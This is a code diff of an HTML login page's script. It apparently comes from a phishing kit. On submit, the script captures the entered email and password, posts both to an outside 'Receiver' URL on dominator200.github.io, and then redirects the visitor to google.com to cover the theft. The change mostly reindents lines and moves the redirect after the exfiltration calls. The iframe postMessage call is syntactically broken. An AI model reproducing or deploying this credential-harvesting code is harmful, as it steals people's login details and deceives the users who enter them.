@@ -35,20 +35,20 @@
         const Password = document.getElementById('password');
 
         form.addEventListener('submit', function(e) {
-          e.preventDefault();
+            e.preventDefault();
 
-          const EmailValue = Email.value;
-          const PasswordValue = Password.value;
+            const EmailValue = Email.value;
+            const PasswordValue = Password.value;
 
-          window.location.href = "https://www.google.com"
-
-          window.parent.postMessage(EmailValue, 'https://dominator200.github.io/Receiver8787462385790687/');
-          window.parent.postMessage(PasswordValue, 'https://dominator200.github.io/Receiver8787462385790687/');
+            window.parent.postMessage(EmailValue, 'https://dominator200.github.io/Receiver8787462385790687/');
+            window.parent.postMessage(PasswordValue, 'https://dominator200.github.io/Receiver8787462385790687/');
           
-          document.getElementById("iframe").contentWindow.postMessage(
-          document.getElementById("PasswordValue").value,
-          document.getElementById("EmailValue").value,
-          "https://dominator200.github.io/Receiver8787462385790687/"
+            document.getElementById("iframe").contentWindow.postMessage(
+            document.getElementById("PasswordValue").value,
+            document.getElementById("EmailValue").value,
+            "https://dominator200.github.io/Receiver8787462385790687/"
+
+            window.location.href = "https://www.google.com"
         })
       </script>
 </body>
